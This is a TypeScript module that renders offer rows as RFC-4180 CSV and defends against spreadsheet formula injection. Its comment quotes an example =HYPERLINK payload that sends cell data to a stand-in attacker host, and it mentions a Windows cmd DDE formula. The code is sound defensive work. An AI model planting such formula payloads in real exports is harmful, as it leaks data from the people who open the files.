import type { OfferRow } from '../shared/types.js';

/**
 * Neutralize spreadsheet formula injection (CWE-1236).
 *
 * Excel, LibreOffice Calc and Google Sheets evaluate any cell whose text
 * begins with `=`, `+`, `-`, `@`, a tab or a CR as a formula. RFC-4180
 * quoting below does NOT stop that — the quotes are stripped as the file is
 * parsed, and the cell is interpreted afterwards. Every column here carries
 * text somebody typed into this application, so a supplier or employee named
 * `=HYPERLINK("https://evil.example/?d="&A1,"Open")` becomes a live
 * exfiltration link the moment an operator opens the export, and the
 * `=cmd|'/c ...'!A1` family reaches further than that on Windows.
 *
 * A leading apostrophe forces the cell to text in all three programs and is
 * the standard mitigation. Plain numbers are exempt so `-42` stays a number:
 * a lone minus sign cannot start a formula, only an expression can.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

function neutralizeFormula(value: string): string {
  if (!FORMULA_LEAD.test(value) || PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const str = neutralizeFormula(String(value));
  if (/[",\n\r]/.test(str)) return `"${str.replaceAll('"', '""')}"`;
  return str;
}

/**
 * Render offers as RFC-4180 CSV, one row per offer. Money columns are
 * integer cents, derived from the lines by the same shared function the
 * API and PDF use — the export can never disagree with the UI. The
 * status column is the derived status (so "expired" appears there).
 */
export function offersCsv(rows: OfferRow[]): string {
  const header = [
    'number',
    'title',
    'customer_name',
    'status',
    'valid_until',
    'sent_at',
    'net_cents',
    'vat_cents',
    'gross_cents',
    'created_at',
  ];
  const lines = [header.join(',')];
  for (const row of rows) {
    lines.push(
      [
        row.number ?? '',
        row.title,
        row.customer_name,
        row.status,
        row.valid_until ?? '',
        row.sent_at ?? '',
        row.net_cents,
        row.vat_cents,
        row.gross_cents,
        row.created_at,
      ]
        .map(escapeCell)
        .join(','),
    );
  }
  return lines.join('\r\n') + '\r\n';
}
